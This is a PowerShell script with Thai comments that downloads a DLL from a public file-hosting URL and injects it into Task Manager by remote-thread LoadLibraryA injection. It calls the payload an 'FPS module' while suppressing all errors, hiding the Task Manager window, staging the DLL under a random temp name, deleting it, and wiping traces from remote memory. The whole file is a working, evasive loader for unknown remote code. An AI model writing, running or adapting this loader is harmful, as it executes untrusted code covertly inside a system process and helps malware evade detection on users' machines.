$script:ok = 0; $script:skip = 0; $script:fail = 0

function Log-OK($msg) { $script:ok++ }
function Log-Skip($msg) { $script:skip++ }
function Log-Fail($msg) { $script:fail++ }

# --- CONFIG ---
$DLL_URL = "https://files.catbox.moe/xlavix.dll"
$DLL_B64 = ""
$PROC_NAME = "Taskmgr"

# ปิดการแสดงผล Progress Bar และ Error ทั้งหมด
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# เปิด ConsoleHost_history.txt (ทำแบบ async)
Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -WindowStyle Normal 2>$null

# --- Win32 API สำหรับซ่อนหน้าต่าง (โหลดเร็ว) ---
# ตรวจสอบก่อนว่า Type มีอยู่แล้วหรือไม่
if (-not ([System.Management.Automation.PSTypeName]'WindowAPI').Type) {
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WindowAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowTitle);
}
"@ 2>$null
    } catch { }
}

# --- Win32 API via P/Invoke (โหลดเร็ว) ---
# ตรวจสอบก่อนว่า Type มีอยู่แล้วหรือไม่
if (-not ([System.Management.Automation.PSTypeName]'NativeAPI').Type) {
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeAPI
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr,
        uint size, uint allocType, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr addr,
        uint size, uint freeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddr,
        byte[] buffer, uint size, out int written);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr attrs,
        uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out IntPtr tid);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetModuleHandleA(string moduleName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public const uint PROCESS_ALL_ACCESS = 0x001FFFFF;
    public const uint MEM_COMMIT  = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint MEM_RELEASE = 0x00008000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint INFINITE = 0xFFFFFFFF;
}
"@ 2>$null
        Log-OK "Native API loaded"
    } catch {
        Log-Skip "Native API already loaded or failed to load"
    }
} else {
    Log-Skip "Native API already exists"
}

# --- STEP 1: Download DLL bytes (รวดเร็ว) ---
$dllBytes = $null
if ($DLL_URL -ne "") {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "WindowsPowerShell/5.0")
        $dllBytes = $wc.DownloadData($DLL_URL)
        $wc.Dispose()
        Log-OK "Downloaded $($dllBytes.Length) bytes from server"
    } catch {
        Log-Fail "Failed to download FPS module ($($_.Exception.Message))"
        exit 1
    }
}
elseif ($DLL_B64 -ne "") {
    try {
        $dllBytes = [Convert]::FromBase64String($DLL_B64)
        Log-OK "Decoded $($dllBytes.Length) bytes from embedded data"
    } catch {
        Log-Fail "Failed to decode embedded data"
        exit 1
    }
}
else {
    Log-Fail "No FPS module source configured"
    exit 1
}

# --- STEP 2: Find or Create target process (รวดเร็ว) ---
$proc = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $proc) {
    Log-OK "Task Manager not running, starting new instance..."
    try {
        # เปิด Task Manager แบบซ่อน (รวดเร็ว)
        $proc = Start-Process -FilePath "taskmgr.exe" -WindowStyle Hidden -PassThru -ErrorAction Stop
        Start-Sleep -Milliseconds 500
        
        $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        
        if ($proc) {
            Log-OK "Started Task Manager (PID: $($proc.Id))"
            
            # ซ่อนหน้าต่าง (ไม่รอ)
            try {
                $hwnd = [WindowAPI]::FindWindow($null, "Task Manager")
                if ($hwnd -ne [IntPtr]::Zero) {
                    [WindowAPI]::ShowWindow($hwnd, 0)
                }
            } catch { }
        } else {
            Log-Fail "Failed to start Task Manager"
            exit 1
        }
    } catch {
        Log-Fail "Failed to start Task Manager: $($_.Exception.Message)"
        exit 1
    }
} else {
    Log-OK "Found existing Task Manager (PID: $($proc.Id))"
    
    # ซ่อนหน้าต่าง (ไม่รอ)
    try {
        $hwnd = [WindowAPI]::FindWindow($null, "Task Manager")
        if ($hwnd -ne [IntPtr]::Zero) {
            [WindowAPI]::ShowWindow($hwnd, 0)
        }
    } catch { }
}

if (-not $proc) {
    Log-Fail "Target process not found"
    exit 1
}

Log-OK "Found: $($proc.ProcessName) (PID: $($proc.Id))"

# --- STEP 3: Open process ---
$procId = $proc.Id
$hProc = [NativeAPI]::OpenProcess([NativeAPI]::PROCESS_ALL_ACCESS, $false, $procId)

if ($hProc -eq [IntPtr]::Zero) {
    Log-Fail "Failed to open process (run as admin?)"
    exit 1
}

Log-OK "Process handle acquired: 0x$($hProc.ToString('X'))"

# --- Allocate memory for DLL bytes in remote process ---
$dllSize = [uint32]$dllBytes.Length
$remoteMem = [NativeAPI]::VirtualAllocEx(
    $hProc, [IntPtr]::Zero, $dllSize,
    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),
    [NativeAPI]::PAGE_EXECUTE_READWRITE
)

if ($remoteMem -eq [IntPtr]::Zero) {
    Log-Fail "Memory allocation failed"
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

Log-OK "Allocated $dllSize bytes at 0x$($remoteMem.ToString('X'))"

# --- Write DLL bytes to remote process ---
$written = 0
$writeOk = [NativeAPI]::WriteProcessMemory($hProc, $remoteMem, $dllBytes, $dllSize, [ref]$written)

if (-not $writeOk) {
    Log-Fail "Memory write failed"
    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE)
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

Log-OK "Wrote $written bytes to remote process"

# --- LoadLibraryA Injection ---
$k32 = [NativeAPI]::GetModuleHandleA("kernel32.dll")
$loadLib = [NativeAPI]::GetProcAddress($k32, "LoadLibraryA")

Log-OK "LoadLibraryA resolved at 0x$($loadLib.ToString('X'))"

# Write DLL to concealed temp path, inject, then delete immediately
$tempName = [System.IO.Path]::GetTempPath() + [Guid]::NewGuid().ToString("N").Substring(0, 8) + ".tmp"
[System.IO.File]::WriteAllBytes($tempName, $dllBytes)

# Write path string to remote process
$pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempName + "`0")
$remoteStr = [NativeAPI]::VirtualAllocEx(
    $hProc, [IntPtr]::Zero, [uint32]$pathBytes.Length,
    ([NativeAPI]::MEM_COMMIT -bor [NativeAPI]::MEM_RESERVE),
    [NativeAPI]::PAGE_READWRITE
)

$w2 = 0
[NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $pathBytes, [uint32]$pathBytes.Length, [ref]$w2) | Out-Null

Log-OK "Path string written to remote memory"

# CreateRemoteThread -> LoadLibraryA(dllPath)
$tid = [IntPtr]::Zero
$hThread = [NativeAPI]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $loadLib, $remoteStr, 0, [ref]$tid)

if ($hThread -eq [IntPtr]::Zero) {
    Log-Fail "Remote thread creation failed"
    Remove-Item $tempName -Force -ErrorAction SilentlyContinue
    [NativeAPI]::CloseHandle($hProc)
    exit 1
}

Log-OK "Remote thread created (TID: 0x$($tid.ToString('X')))"

# Wait for thread to complete (DLL loaded) - ลดเวลารอ
[NativeAPI]::WaitForSingleObject($hThread, 1000) | Out-Null

Log-OK "FPS module loaded successfully into Task Manager"

# --- STEP 4: Clean up ---
Start-Sleep -Milliseconds 200
try {
    Remove-Item $tempName -Force -ErrorAction Stop
    Log-OK "Temp file deleted"
} catch {
    Log-Fail "Could not delete temp file (may be locked)"
}

# Overwrite the path in remote memory with zeros
try {
    $zeros = New-Object byte[] $pathBytes.Length
    [NativeAPI]::WriteProcessMemory($hProc, $remoteStr, $zeros, [uint32]$zeros.Length, [ref]$w2) | Out-Null
    [NativeAPI]::VirtualFreeEx($hProc, $remoteStr, 0, [NativeAPI]::MEM_RELEASE) | Out-Null
    Log-OK "Remote path memory cleared"
} catch {
    Log-Skip "Remote memory cleanup skipped"
}

# Free the raw DLL bytes region
try {
    [NativeAPI]::VirtualFreeEx($hProc, $remoteMem, 0, [NativeAPI]::MEM_RELEASE) | Out-Null
    Log-OK "Remote DLL memory freed"
} catch {
    Log-Skip "Remote DLL memory cleanup skipped"
}

# Clean up handles
[NativeAPI]::CloseHandle($hThread) | Out-Null
[NativeAPI]::CloseHandle($hProc) | Out-Null
Log-OK "Handles closed"

# Clear variables from memory
$dllBytes = $null
$pathBytes = $null
[GC]::Collect()
Log-OK "Memory cleared"

# Summary
Write-Host "success"